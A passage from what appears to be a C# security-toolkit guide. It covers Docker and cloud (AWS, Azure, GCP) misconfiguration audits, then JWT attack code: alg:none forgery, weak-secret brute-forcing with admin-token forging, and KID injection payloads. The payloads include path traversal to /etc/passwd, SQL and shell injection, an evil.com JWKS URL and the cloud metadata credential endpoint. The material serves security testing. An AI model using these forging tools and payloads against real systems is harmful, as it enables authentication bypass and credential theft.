        var systemInfo = await _client.System.GetSystemInfoAsync();

        audit.ServerVersion = systemInfo.ServerVersion;
        audit.OperatingSystem = systemInfo.OperatingSystem;
        audit.ContainersRunning = systemInfo.ContainersRunning;
        audit.ContainersStopped = systemInfo.ContainersStopped;
        audit.ImagesCount = systemInfo.Images;

        // Check if user namespace remapping is enabled
        // systemInfo has SecurityOptions
        audit.SecurityOptions = systemInfo.SecurityOptions?.ToList() ?? new();

        // Check for AppArmor/SELinux
        audit.HasAppArmor = systemInfo.SecurityOptions?.Contains("apparmor") ?? false;
        audit.HasSeccomp = systemInfo.SecurityOptions?.Contains("seccomp") ?? false;

        return audit;
    }
```

### 2.6 CLI-Based Docker Audit (Alternative/Fallback)

```csharp
/// <summary>
/// Fallback auditor that shells out to 'docker' CLI when Docker.DotNet
/// socket access is not available.
/// </summary>
public class DockerCliAuditor
{
    private readonly ICommandExecutor _executor;

    public DockerCliAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<List<string>> FindPrivilegedContainersAsync()
    {
        var result = await _executor.ExecuteAsync(
            "docker ps --quiet --all | xargs docker inspect --format '{{.Id}}: {{.Name}} privileged={{.HostConfig.Privileged}}' | grep 'privileged=true'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    public async Task<List<string>> FindDockerSockMountsAsync()
    {
        var result = await _executor.ExecuteAsync(
            "docker ps --quiet | xargs docker inspect --format '{{.Id}}: {{.Name}}' --filter 'volume=/var/run/docker.sock'");
        // Simpler approach:
        var r2 = await _executor.ExecuteAsync(
            "docker ps --quiet | xargs -I{} docker inspect {} --format '{{.Id}}: Binds={{.HostConfig.Binds}}' | grep docker.sock");
        return r2.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    public async Task<string> DockerBenchSecurity()
    {
        // Run docker-bench-security if available
        var result = await _executor.ExecuteAsync(
            "docker run --rm --pid=host --cap-add AUDIT_READ " +
            "-v /etc:/etc:ro -v /usr/bin/docker:/usr/bin/docker:ro " +
            "-v /usr/lib/systemd:/usr/lib/systemd:ro " +
            "-v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro " +
            "--label docker_bench_security " +
            "docker/docker-bench-security 2>/dev/null | tail -50 || echo 'docker-bench-security not available'");
        return result.Stdout;
    }
}
```

### 2.7 Data Models for Docker Module

```csharp
public record ContainerSecurityFinding(
    string ContainerId,
    string ContainerName,
    string Issue,
    Severity Severity,
    string Description,
    string Remediation
);

public record ImageSecurityFinding(
    string ImageId,
    string ImageName,
    string Issue,
    Severity Severity,
    string Description,
    string Remediation
);

public class DockerDaemonAudit
{
    public string ServerVersion { get; set; } = "";
    public string OperatingSystem { get; set; } = "";
    public long ContainersRunning { get; set; }
    public long ContainersStopped { get; set; }
    public long ImagesCount { get; set; }
    public List<string> SecurityOptions { get; set; } = new();
    public bool HasAppArmor { get; set; }
    public bool HasSeccomp { get; set; }
}

public enum Severity { Critical, High, Medium, Low, Info }
```

### 2.8 Key Indicators of Insecure Docker Setup

| Indicator | Severity | Detection |
|-----------|----------|-----------|
| `--privileged` flag | Critical | `HostConfig.Privileged == true` |
| Docker socket mounted | Critical | Check `Binds` for `/var/run/docker.sock` |
| `SYS_ADMIN` capability | High | `CapAdd` contains `SYS_ADMIN` |
| Host network mode | High | `NetworkMode == "host"` |
| Host PID namespace | High | `PidMode == "host"` |
| Sensitive host bind mounts | High | `/proc`, `/sys`, `/` in `Binds` |
| No memory/CPU limits | Low | `Memory == 0`, `NanoCPUs == 0` |
| Writable root filesystem | Medium | `ReadonlyRootfs == false` |
| User namespace disabled | Medium | `SecurityOptions` lacks `userns` |
| Image runs as root | High | `Config.User` is null or `root` |
| Hardcoded secrets in ENV | High | ENV contains PASSWORD/SECRET/TOKEN |
| Suspicious port exposure | Medium | Ports 22, 3389, 5432, 27017 published |

---

## 3. Cloud Audit APIs

### 3.1 AWS — NuGet Packages

```xml
<PackageReference Include="AWSSDK.SecurityToken" Version="3.7.*" />
<PackageReference Include="AWSSDK.IdentityManagement" Version="3.7.*" />
<PackageReference Include="AWSSDK.EC2" Version="3.7.*" />
<PackageReference Include="AWSSDK.S3" Version="3.7.*" />
<PackageReference Include="AWSSDK.CloudTrail" Version="3.7.*" />
<PackageReference Include="AWSSDK.ConfigService" Version="3.7.*" />
<PackageReference Include="AWSSDK.SecurityHub" Version="3.7.*" />
```

### 3.2 AWS Client Setup

```csharp
using Amazon;
using Amazon.S3;
using Amazon.IdentityManagement;
using Amazon.EC2;
using Amazon.Runtime;

namespace SecKit.Core.Cloud.AWS;

public class AwsAuditor : IDisposable
{
    private readonly IAmazonS3 _s3;
    private readonly IAmazonIdentityManagementService _iam;
    private readonly IAmazonEC2 _ec2;

    /// <summary>
    /// Uses default credential chain: env vars → ~/.aws/credentials → instance profile
    /// </summary>
    public AwsAuditor(string region = "us-east-1")
    {
        var regionEndpoint = RegionEndpoint.GetBySystemName(region);
        _s3 = new AmazonS3Client(regionEndpoint);
        _iam = new AmazonIdentityManagementServiceClient(regionEndpoint);
        _ec2 = new AmazonEC2Client(regionEndpoint);
    }

    /// <summary>
    /// Explicit credentials (not recommended for production —
    /// prefer IAM roles or env vars)
    /// </summary>
    public AwsAuditor(string accessKey, string secretKey, string region = "us-east-1")
    {
        var creds = new BasicAWSCredentials(accessKey, secretKey);
        var regionEndpoint = RegionEndpoint.GetBySystemName(region);
        _s3 = new AmazonS3Client(creds, regionEndpoint);
        _iam = new AmazonIdentityManagementServiceClient(creds, regionEndpoint);
        _ec2 = new AmazonEC2Client(creds, regionEndpoint);
    }
```

### 3.3 S3 Bucket Audit — Public Access Check

```csharp
    public async Task<List<S3BucketFinding>> AuditS3BucketsAsync()
    {
        var findings = new List<S3BucketFinding>();
        var buckets = await _s3.ListBucketsAsync();

        foreach (var bucket in buckets.Buckets)
        {
            try
            {
                // Check public access block
                var publicAccessBlock = await _s3.GetPublicAccessBlockAsync(
                    new Amazon.S3.Model.GetPublicAccessBlockRequest
                    {
                        BucketName = bucket.BucketName
                    });

                var blockConfig = publicAccessBlock.PublicAccessBlockConfiguration;
                bool blockPublicAcls = blockConfig.BlockPublicAcls;
                bool blockPublicPolicy = blockConfig.BlockPublicPolicy;
                bool ignorePublicAcls = blockConfig.IgnorePublicAcls;
                bool restrictPublicBuckets = blockConfig.RestrictPublicBuckets;

                // Check bucket ACL
                var acl = await _s3.GetACLAsync(bucket.BucketName);
                bool hasPublicAcl = acl.AccessControlList.Any(grant =>
                    grant.Grantee.URI != null &&
                    grant.Grantee.URI.Contains("AllUsers"));

                // Check bucket policy
                bool hasPublicPolicy = false;
                try
                {
                    var policy = await _s3.GetBucketPolicyAsync(bucket.BucketName);
                    hasPublicPolicy = policy.Policy.Contains("\"Principal\":\"*\"") ||
                                      policy.Policy.Contains("\"Principal\" : \"*\"");
                }
                catch (AmazonS3Exception ex) when (ex.StatusCode == System.Net.HttpStatusCode.NotFound)
                {
                    // No bucket policy — fine
                }

                // Check encryption
                bool hasEncryption = false;
                try
                {
                    await _s3.GetBucketEncryptionAsync(new Amazon.S3.Model.GetBucketEncryptionRequest
                    {
                        BucketName = bucket.BucketName
                    });
                    hasEncryption = true;
                }
                catch { }

                // Check versioning
                var versioning = await _s3.GetBucketVersioningAsync(bucket.BucketName);
                bool versioningEnabled = versioning.VersioningConfig?.Status ==
                    Amazon.S3.VersionStatus.Enabled;

                // Logging enabled?
                bool loggingEnabled = false;
                try
                {
                    var logging = await _s3.GetBucketLoggingAsync(bucket.BucketName);
                    loggingEnabled = logging.BucketLoggingConfig?.TargetBucketName != null;
                }
                catch { }

                findings.Add(new S3BucketFinding
                {
                    BucketName = bucket.BucketName,
                    Created = bucket.CreationDate,
                    // Public access assessment
                    IsPublicAcl = hasPublicAcl,
                    HasPublicPolicy = hasPublicPolicy,
                    BlockPublicAcls = blockPublicAcls,
                    BlockPublicPolicy = blockPublicPolicy,
                    IgnorePublicAcls = ignorePublicAcls,
                    RestrictPublicBuckets = restrictPublicBuckets,
                    // Encryption & logging
                    HasDefaultEncryption = hasEncryption,
                    VersioningEnabled = versioningEnabled,
                    LoggingEnabled = loggingEnabled,
                    // Overall risk
                    RiskLevel = hasPublicAcl || hasPublicPolicy ? RiskLevel.Critical :
                        (!blockPublicAcls || !blockPublicPolicy) ? RiskLevel.High :
                        RiskLevel.Low
                });
            }
            catch (Exception ex)
            {
                findings.Add(new S3BucketFinding
                {
                    BucketName = bucket.BucketName,
                    Error = ex.Message,
                    RiskLevel = RiskLevel.Unknown
                });
            }
        }

        return findings;
    }

    public void Dispose()
    {
        _s3.Dispose();
        _iam.Dispose();
        _ec2.Dispose();
    }
}
```

### 3.4 IAM Audit — Users, MFA, Access Keys

```csharp
public class IamAuditor
{
    private readonly IAmazonIdentityManagementService _iam;

    public IamAuditor(IAmazonIdentityManagementService iam) => _iam = iam;

    public async Task<List<IamUserFinding>> AuditUsersAsync()
    {
        var findings = new List<IamUserFinding>();
        var users = await _iam.ListUsersAsync();

        foreach (var user in users.Users)
        {
            var finding = new IamUserFinding
            {
                UserName = user.UserName,
                UserId = user.UserId,
                Created = user.CreateDate,
                Arn = user.Arn,
            };

            // Check MFA
            var mfaDevices = await _iam.ListMFADevicesAsync(user.UserName);
            finding.HasMfa = mfaDevices.MFADevices.Count > 0;
            finding.MfaDeviceCount = mfaDevices.MFADevices.Count;

            // Check access keys age
            var accessKeys = await _iam.ListAccessKeysAsync(
                new Amazon.IdentityManagement.Model.ListAccessKeysRequest
                {
                    UserName = user.UserName
                });

            finding.AccessKeyCount = accessKeys.AccessKeyMetadata.Count;
            finding.HasActiveKeys = accessKeys.AccessKeyMetadata.Any(k => k.Status == StatusType.Active);

            var oldestKey = accessKeys.AccessKeyMetadata
                .OrderBy(k => k.CreateDate)
                .FirstOrDefault();

            if (oldestKey != null)
            {
                finding.OldestAccessKeyAge = (DateTime.UtcNow - oldestKey.CreateDate).Days;
                finding.OldestKeyRotationNeeded = finding.OldestAccessKeyAge > 90;
            }

            // Check attached policies (look for AdministratorAccess)
            var attachedPolicies = await _iam.ListAttachedUserPoliciesAsync(user.UserName);
            finding.AdminAccess = attachedPolicies.AttachedPolicies.Any(p =>
                p.PolicyName.Contains("AdministratorAccess", StringComparison.OrdinalIgnoreCase));

            // Check if user has console access (login profile)
            try
            {
                await _iam.GetLoginProfileAsync(
                    new Amazon.IdentityManagement.Model.GetLoginProfileRequest
                    {
                        UserName = user.UserName
                    });
                finding.HasConsoleAccess = true;
            }
            catch { finding.HasConsoleAccess = false; }

            // Check inline policies
            var inlinePolicies = await _iam.ListUserPoliciesAsync(user.UserName);
            finding.InlinePolicyCount = inlinePolicies.PolicyNames.Count;

            // Password last changed
            if (user.PasswordLastUsed.HasValue)
            {
                finding.PasswordLastUsed = user.PasswordLastUsed.Value;
                finding.PasswordNotUsedDays = (int)(DateTime.UtcNow - user.PasswordLastUsed.Value).TotalDays;
            }

            // Determine risk
            finding.RiskLevel = DetermineIamRisk(finding);

            findings.Add(finding);
        }

        return findings;
    }

    private RiskLevel DetermineIamRisk(IamUserFinding f)
    {
        if (!f.HasMfa && f.HasConsoleAccess && f.AdminAccess)
            return RiskLevel.Critical;
        if (!f.HasMfa && (f.HasActiveKeys || f.HasConsoleAccess))
            return RiskLevel.High;
        if (f.OldestKeyRotationNeeded)
            return RiskLevel.Medium;
        if (!f.HasMfa)
            return RiskLevel.Medium;
        return RiskLevel.Low;
    }

    /// Audit IAM password policy
    public async Task<PasswordPolicyAudit> AuditPasswordPolicyAsync()
    {
        try
        {
            var policy = await _iam.GetAccountPasswordPolicyAsync();
            var pp = policy.PasswordPolicy;
            return new PasswordPolicyAudit
            {
                Exists = true,
                MinimumPasswordLength = pp.MinimumPasswordLength,
                RequireSymbols = pp.RequireSymbols,
                RequireNumbers = pp.RequireNumbers,
                RequireUppercaseCharacters = pp.RequireUppercaseCharacters,
                RequireLowercaseCharacters = pp.RequireLowercaseCharacters,
                AllowUsersToChangePassword = pp.AllowUsersToChangePassword,
                MaxPasswordAge = pp.MaxPasswordAge,
                PasswordReusePrevention = pp.PasswordReusePrevention,
                HardExpiry = pp.HardExpiry,
                Score = CalculatePasswordPolicyScore(pp),
            };
        }
        catch (NoSuchEntityException)
        {
            return new PasswordPolicyAudit { Exists = false, Score = 0 };
        }
    }

    private int CalculatePasswordPolicyScore(Amazon.IdentityManagement.Model.PasswordPolicy pp)
    {
        int score = 0;
        if (pp.MinimumPasswordLength >= 14) score += 3;
        else if (pp.MinimumPasswordLength >= 8) score += 1;
        if (pp.RequireSymbols) score += 1;
        if (pp.RequireNumbers) score += 1;
        if (pp.RequireUppercaseCharacters) score += 1;
        if (pp.RequireLowercaseCharacters) score += 1;
        if (pp.MaxPasswordAge > 0 && pp.MaxPasswordAge <= 90) score += 2;
        if (pp.PasswordReusePrevention >= 5) score += 1;
        return score; // Max 10
    }
}
```

### 3.5 EC2 Security Group Audit — 0.0.0.0/0 Rules

```csharp
public class Ec2SecurityAuditor
{
    private readonly IAmazonEC2 _ec2;

    public Ec2SecurityAuditor(IAmazonEC2 ec2) => _ec2 = ec2;

    public async Task<List<SecurityGroupFinding>> AuditSecurityGroupsAsync()
    {
        var findings = new List<SecurityGroupFinding>();
        var sgs = await _ec2.DescribeSecurityGroupsAsync(new Amazon.EC2.Model.DescribeSecurityGroupsRequest());

        foreach (var sg in sgs.SecurityGroups)
        {
            foreach (var rule in sg.IngressRules)
            {
                // Check for 0.0.0.0/0 (anywhere)
                if (rule.IpRanges.Any(r => r.CidrIp == "0.0.0.0/0") ||
                    rule.Ipv6Ranges.Any(r => r.CidrIpv6 == "::/0"))
                {
                    int? fromPort = rule.FromPort;
                    int? toPort = rule.ToPort;
                    string portRange = fromPort == toPort
                        ? $"{fromPort}"
                        : $"{fromPort}-{toPort}";

                    findings.Add(new SecurityGroupFinding
                    {
                        GroupId = sg.GroupId,
                        GroupName = sg.GroupName ?? "",
                        VpcId = sg.VpcId,
                        Protocol = rule.IpProtocol,
                        PortRange = portRange,
                        PortDescription = ClassifyPortRisk(fromPort ?? 0),
                        Cidr = "0.0.0.0/0",
                        RiskLevel = ClassifyOpenPortRisk(fromPort ?? 0),
                        Recommendation = GetRecommendation(sg.GroupName ?? sg.GroupId, fromPort ?? 0),
                    });
                }
            }
        }

        return findings.OrderByDescending(f => f.RiskLevel).ToList();
    }

    private string ClassifyPortRisk(int port)
    {
        return port switch
        {
            22 => "SSH — remote shell access",
            3389 => "RDP — remote desktop",
            3306 => "MySQL database",
            5432 => "PostgreSQL database",
            1433 => "MSSQL database",
            27017 => "MongoDB database",
            6379 => "Redis (often no auth by default)",
            9200 or 9300 => "Elasticsearch",
            80 or 8080 => "HTTP",
            443 or 8443 => "HTTPS",
            21 => "FTP (cleartext)",
            23 => "Telnet (cleartext)",
            25 => "SMTP",
            53 => "DNS",
            11211 => "Memcached",
            _ => "Other"
        };
    }

    private RiskLevel ClassifyOpenPortRisk(int port)
    {
        return port switch
        {
            22 or 3389 or 21 or 23 => RiskLevel.Critical,
            3306 or 5432 or 1433 or 27017 or 6379 or 9200 => RiskLevel.Critical,
            25 or 11211 => RiskLevel.High,
            80 or 8080 or 443 or 8443 => RiskLevel.Info,
            _ => RiskLevel.Medium,
        };
    }

    private string GetRecommendation(string sgName, int port)
    {
        return port switch
        {
            22 => "Restrict SSH to specific IP ranges or use AWS Systems Manager Session Manager.",
            3389 => "Restrict RDP to VPN/bastion IP ranges or use AWS Systems Manager.",
            3306 or 5432 or 1433 or 27017 =>
                "Database ports should never be open to the internet. Restrict to application security group only.",
            6379 => "Redis open to the internet is extremely dangerous. Restrict to VPC only and enable AUTH.",
            _ => "Restrict to specific CIDR ranges that require access."
        };
    }
}
```

### 3.6 Data Models for AWS

```csharp
public record S3BucketFinding
{
    public string BucketName { get; init; } = "";
    public DateTime Created { get; init; }
    public bool IsPublicAcl { get; init; }
    public bool HasPublicPolicy { get; init; }
    public bool BlockPublicAcls { get; init; }
    public bool BlockPublicPolicy { get; init; }
    public bool IgnorePublicAcls { get; init; }
    public bool RestrictPublicBuckets { get; init; }
    public bool HasDefaultEncryption { get; init; }
    public bool VersioningEnabled { get; init; }
    public bool LoggingEnabled { get; init; }
    public string Error { get; init; } = "";
    public RiskLevel RiskLevel { get; init; }
}

public class IamUserFinding
{
    public string UserName { get; set; } = "";
    public string UserId { get; set; } = "";
    public string Arn { get; set; } = "";
    public DateTime Created { get; set; }
    public bool HasMfa { get; set; }
    public int MfaDeviceCount { get; set; }
    public int AccessKeyCount { get; set; }
    public bool HasActiveKeys { get; set; }
    public int OldestAccessKeyAge { get; set; }
    public bool OldestKeyRotationNeeded { get; set; }
    public bool AdminAccess { get; set; }
    public bool HasConsoleAccess { get; set; }
    public int InlinePolicyCount { get; set; }
    public DateTime? PasswordLastUsed { get; set; }
    public int PasswordNotUsedDays { get; set; }
    public RiskLevel RiskLevel { get; set; }
}

public record SecurityGroupFinding
{
    public string GroupId { get; init; } = "";
    public string GroupName { get; init; } = "";
    public string VpcId { get; init; } = "";
    public string Protocol { get; init; } = "";
    public string PortRange { get; init; } = "";
    public string PortDescription { get; init; } = "";
    public string Cidr { get; init; } = "";
    public RiskLevel RiskLevel { get; init; }
    public string Recommendation { get; init; } = "";
}

public class PasswordPolicyAudit
{
    public bool Exists { get; set; }
    public int MinimumPasswordLength { get; set; }
    public bool RequireSymbols { get; set; }
    public bool RequireNumbers { get; set; }
    public bool RequireUppercaseCharacters { get; set; }
    public bool RequireLowercaseCharacters { get; set; }
    public bool AllowUsersToChangePassword { get; set; }
    public int MaxPasswordAge { get; set; }
    public int PasswordReusePrevention { get; set; }
    public bool HardExpiry { get; set; }
    public int Score { get; set; }
}

public enum RiskLevel { Critical, High, Medium, Low, Info, Unknown }
```

### 3.7 Azure Equivalent (Key NuGet Packages)

```xml
<PackageReference Include="Azure.Identity" Version="1.12.*" />
<PackageReference Include="Azure.ResourceManager" Version="1.12.*" />
<PackageReference Include="Azure.ResourceManager.Storage" Version="1.2.*" />
<PackageReference Include="Azure.ResourceManager.Network" Version="1.7.*" />
<PackageReference Include="Azure.ResourceManager.Compute" Version="1.4.*" />
<PackageReference Include="Azure.ResourceManager.KeyVault" Version="1.2.*" />
```

```csharp
using Azure.Identity;
using Azure.ResourceManager;
using Azure.ResourceManager.Storage;
using Azure.ResourceManager.Network;

// Azure SDK uses ArmClient pattern
var credential = new DefaultAzureCredential();
var armClient = new ArmClient(credential);
var subscription = armClient.GetDefaultSubscription();

// List storage accounts & check public access
await foreach (var storageAccount in subscription.GetStorageAccountsAsync())
{
    // Check blob public access
    var blobProps = storageAccount.Data.BlobPublicAccess; // Container, Blob, or None

    // Check HTTPS-only
    var httpsOnly = storageAccount.Data.EnableHttpsTrafficOnly;

    // Check minimum TLS version
    var minTls = storageAccount.Data.MinimumTlsVersion;
}

// List NSGs (security groups) & check 0.0.0.0/0 rules
await foreach (var nsg in subscription.GetNetworkSecurityGroupsAsync())
{
    foreach (var rule in nsg.Data.SecurityRules)
    {
        if (rule.SourceAddressPrefix == "*" || rule.SourceAddressPrefix == "0.0.0.0/0" ||
            rule.SourceAddressPrefix == "Internet")
        {
            // Open to internet!
            Console.WriteLine($"NSG {nsg.Data.Name}: {rule.Name} open to internet on {rule.DestinationPortRange}");
        }
    }
}
```

### 3.8 GCP Equivalent (Key NuGet Packages)

```xml
<PackageReference Include="Google.Cloud.Storage.V1" Version="4.10.*" />
<PackageReference Include="Google.Cloud.Iam.Credentials.V1" Version="2.3.*" />
<PackageReference Include="Google.Cloud.SecurityCenter.V1" Version="3.20.*" />
<PackageReference Include="Google.Cloud.Asset.V1" Version="3.6.*" />
<PackageReference Include="Google.Cloud.ResourceManager.V3" Version="2.4.*" />
```

```csharp
using Google.Cloud.Storage.V1;
using Google.Cloud.Iam.V1;
using Google.Api.Gax;

// GCP uses service account JSON key file
Environment.SetEnvironmentVariable("GOOGLE_APPLICATION_CREDENTIALS",
    "/path/to/service-account-key.json");

// Check GCS bucket public access
var storageClient = StorageClient.Create();
foreach (var bucket in storageClient.ListBuckets("your-project-id"))
{
    var policy = storageClient.GetBucketIamPolicy(bucket.Name);
    bool isPublic = policy.Bindings.Any(b =>
        b.Members.Contains("allUsers") || b.Members.Contains("allAuthenticatedUsers"));
    Console.WriteLine($"Bucket {bucket.Name}: Public={isPublic}");
}

// For IAM and compute firewall rules, use Google.Cloud.Compute.V1
// and Google.Cloud.Iam.Admin.V1 packages
```

---

## 4. JWT Security Testing in C#

### 4.1 NuGet Packages

```xml
<PackageReference Include="System.IdentityModel.Tokens.Jwt" Version="8.1.*" />
<PackageReference Include="Microsoft.IdentityModel.Tokens" Version="8.1.*" />
<PackageReference Include="Microsoft.IdentityModel.JsonWebTokens" Version="8.1.*" />
```

### 4.2 JWT Decoding Without Validation

```csharp
using System.IdentityModel.Tokens.Jwt;
using System.Text;
using System.Text.Json;

namespace SecKit.Core.JwtTesting;

public class JwtAnalyzer
{
    /// <summary>
    /// Decode a JWT WITHOUT signature validation — reads header and payload.
    /// This is how attackers inspect tokens before crafting attacks.
    /// </summary>
    public static JwtDecoded DecodeWithoutValidation(string token)
    {
        var handler = new JwtSecurityTokenHandler();

        // ReadToken decodes but does NOT validate
        // NOTE: JwtSecurityTokenHandler.ReadJwtToken reads without
        // validating signature if you don't pass validation params
        var jwt = handler.ReadJwtToken(token);

        return new JwtDecoded
        {
            Header = jwt.Header.SerializeToJson(),
            HeaderAlgorithm = jwt.Header.Alg,
            HeaderType = jwt.Header.Typ,
            HeaderKid = jwt.Header.Kid,
            Payload = jwt.Payload.SerializeToJson(),
            Claims = jwt.Claims.Select(c => new ClaimInfo(c.Type, c.Value)).ToList(),
            Issuer = jwt.Issuer,
            Audience = jwt.Audiences.ToList(),
            Subject = jwt.Subject,
            Expiration = jwt.ValidTo,
            IssuedAt = jwt.ValidFrom,
            NotBefore = jwt.Payload.Nbf,
            Signature = jwt.RawSignature,
            TokenLength = token.Length,
        };
    }

    /// <summary>
    /// Manual base64 decode of header & payload (no library needed).
    /// Useful for writing attack tools that bypass library protections.
    /// </summary>
    public static (string Header, string Payload) ManualDecode(string token)
    {
        var parts = token.Split('.');
        if (parts.Length < 2)
            throw new ArgumentException("Invalid JWT format");

        string DecodePart(string base64)
        {
            // Add padding
            var padded = base64.PadRight(base64.Length + (4 - base64.Length % 4) % 4, '=');
            // Replace URL-safe chars
            padded = padded.Replace('-', '+').Replace('_', '/');
            var bytes = Convert.FromBase64String(padded);
            return Encoding.UTF8.GetString(bytes);
        }

        return (DecodePart(parts[0]), DecodePart(parts[1]));
    }
}

public record JwtDecoded
{
    public string Header { get; init; } = "";
    public string HeaderAlgorithm { get; init; } = "";
    public string HeaderType { get; init; } = "";
    public string HeaderKid { get; init; } = "";
    public string Payload { get; init; } = "";
    public List<ClaimInfo> Claims { get; init; } = new();
    public string Issuer { get; init; } = "";
    public List<string> Audience { get; init; } = new();
    public string Subject { get; init; } = "";
    public DateTime Expiration { get; init; }
    public DateTime IssuedAt { get; init; }
    public long? NotBefore { get; init; }
    public string Signature { get; init; } = "";
    public int TokenLength { get; init; }
}

public record ClaimInfo(string Type, string Value);
```

### 4.3 Attack 1: Algorithm Confusion — "alg: none"

```csharp
public class JwtAttackNoneAlgorithm
{
    /// <summary>
    /// Test if the server accepts JWT with alg=none.
    /// This works when the server uses the token's declared algorithm
    /// instead of the expected algorithm.
    /// </summary>
    public static string CreateNoneAlgorithmToken(string originalToken)
    {
        var parts = originalToken.Split('.');
        if (parts.Length != 3)
            throw new ArgumentException("Not a valid JWT");

        // Decode original header
        var headerJson = Encoding.UTF8.GetString(
            Convert.FromBase64String(PadBase64(parts[0])));
        var header = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(headerJson)!;

        // Replace alg with "none"
        header["alg"] = JsonSerializer.SerializeToElement("none");

        // Re-encode header
        var newHeader = JsonSerializer.Serialize(header);
        var newHeaderB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(newHeader))
            .TrimEnd('=').Replace('+', '-').Replace('/', '_');

        // Return token with "none" alg and empty signature
        return $"{newHeaderB64}.{parts[1]}.";
    }

    /// <summary>
    /// Test: Send the none-alg token and check if server accepts it.
    /// </summary>
    public static async Task<JwtAttackResult> TestNoneAttack(
        HttpClient client, string endpoint, string originalToken)
    {
        var noneToken = CreateNoneAlgorithmToken(originalToken);

        var request = new HttpRequestMessage(HttpMethod.Get, endpoint);
        request.Headers.Authorization = new("Bearer", noneToken);

        var response = await client.SendAsync(request);

        return new JwtAttackResult
        {
            AttackName = "alg:none",
            Vulnerable = response.StatusCode == System.Net.HttpStatusCode.OK,
            ResponseCode = (int)response.StatusCode,
            ResponseBody = await response.Content.ReadAsStringAsync(),
            Severity = Severity.Critical,
            Recommendation = "Configure JWT validation to explicitly specify allowed algorithms " +
                "(e.g., only RS256, never accept 'none'). In .NET, use " +
                "TokenValidationParameters.ValidAlgorithms."
        };
    }

    private static string PadBase64(string base64)
    {
        return base64.PadRight(base64.Length + (4 - base64.Length % 4) % 4, '=')
            .Replace('-', '+').Replace('_', '/');
    }
}
```

### 4.4 Attack 2: Weak HMAC Secret Brute-Force

```csharp
public class JwtAttackWeakHmac
{
    private static readonly List<string> CommonSecrets = new()
    {
        "secret", "password", "admin", "key", "jwt_secret", "mysecret",
        "super_secret", "changeme", "123456", "jwt", "default",
        "secretkey", "secret_key", "supersecretkey", "privatekey",
        "accesstoken", "access_token", "app_secret", "appsecret",
    };

    /// <summary>
    /// Attempt to verify a JWT using a list of common weak HMAC secrets.
    /// </summary>
    public static async Task<List<WeakSecretFinding>> BruteForceWeakSecrets(string token)
    {
        var findings = new List<WeakSecretFinding>();

        foreach (var secret in CommonSecrets)
        {
            try
            {
                var handler = new JwtSecurityTokenHandler();
                var key = new Microsoft.IdentityModel.Tokens.SymmetricSecurityKey(
                    Encoding.UTF8.GetBytes(secret));

                var validationParams = new Microsoft.IdentityModel.Tokens.TokenValidationParameters
                {
                    ValidateIssuer = false,
                    ValidateAudience = false,
                    ValidateLifetime = false,
                    ValidateIssuerSigningKey = true,
                    IssuerSigningKey = key,
                };

                var principal = handler.ValidateToken(token, validationParams, out var validatedToken);
                // If we get here, the secret worked!
                findings.Add(new WeakSecretFinding
                {
                    Secret = secret,
                    CanForgeTokens = true,
                });
            }
            catch
            {
                // Secret didn't work, continue
            }
        }

        return findings;
    }

    /// <summary>
    /// If a weak secret is found, forge a token with admin claims.
    /// </summary>
    public static string ForgeTokenWithSecret(
        string secret, Dictionary<string, object> claims)
    {
        var key = new Microsoft.IdentityModel.Tokens.SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(secret));
        var credentials = new Microsoft.IdentityModel.Tokens.SigningCredentials(
            key, Microsoft.IdentityModel.Tokens.SecurityAlgorithms.HmacSha256);

        var tokenDescriptor = new Microsoft.IdentityModel.Tokens.SecurityTokenDescriptor
        {
            Claims = claims,
            Expires = DateTime.UtcNow.AddHours(1),
            SigningCredentials = credentials,
        };

        var handler = new JwtSecurityTokenHandler();
        var token = handler.CreateToken(tokenDescriptor);
        return handler.WriteToken(token);
    }
}

public record WeakSecretFinding
{
    public string Secret { get; init; } = "";
    public bool CanForgeTokens { get; init; }
}

public record JwtAttackResult
{
    public string AttackName { get; init; } = "";
    public bool Vulnerable { get; init; }
    public int ResponseCode { get; init; }
    public string ResponseBody { get; init; } = "";
    public Severity Severity { get; init; }
    public string Recommendation { get; init; } = "";
}
```

### 4.5 Attack 3: KID Injection (Key ID Header Injection)

```csharp
public class JwtAttackKidInjection
{
    /// <summary>
    /// Test KID injection attacks:
    /// 1. Path traversal in KID to read files (../../../etc/passwd)
    /// 2. SQL injection in KID if used in DB queries
    /// 3. Command injection in KID if used in shell commands
    /// </summary>
    public static List<string> GenerateKidInjectionPayloads()
    {
        return new List<string>
        {
            // Path traversal
            "../../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "/dev/null",
            "/proc/self/environ",

            // SQL injection
            "' OR '1'='1",
            "1; DROP TABLE keys; --",
            "1' UNION SELECT 'admin' --",

            // Command injection
            "$(id)",
            "`id`",
            "| id",
            "; id",
            "& id &",
            "|| id",

            // Null byte
            "legit-key\x00.sqlite",

            // Open redirect
            "https://evil.com/jwks.json",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        };
    }

    /// <summary>
    /// Create JWT with modified KID header.
    /// </summary>
    public static string CreateKidModifiedToken(string originalToken, string newKid)
    {
        var parts = originalToken.Split('.');
        var headerJson = Encoding.UTF8.GetString(
            Convert.FromBase64String(PadBase64(parts[0])));
        var header = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(headerJson)!;

        header["kid"] = JsonSerializer.SerializeToElement(newKid);

        var newHeader = JsonSerializer.Serialize(header);
        var newHeaderB64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(newHeader))
            .TrimEnd('=').Replace('+', '-').Replace('/', '_');

        // Keep original payload and signature (signature will be invalid,
        // but we're testing if server processes KID before verifying sig)
        return $"{newHeaderB64}.{parts[1]}.{parts[2]}";
    }

    private static string PadBase64(string b64)
        => b64.PadRight(b64.Length + (4 - b64.Length % 4) % 4, '=')
            .Replace('-', '+').Replace('_', '/');
}
```

### 4.6 Attack 4: Algorithm Confusion — HMAC vs RSA

```csharp
public class JwtAttackAlgorithmConfusion
{
    /// <summary>
    /// When a server expects RS256 (asymmetric) but we can trick it into
    /// using HS256 (symmetric) with the RSA public key as the HMAC secret.
    ///
    /// This works when:
    /// 1. The server jwks.json reveals the public key
    /// 2. The server doesn't pin the algorithm to RS256
    /// 3. We sign with HS256 using the public key as the secret
    /// </summary>
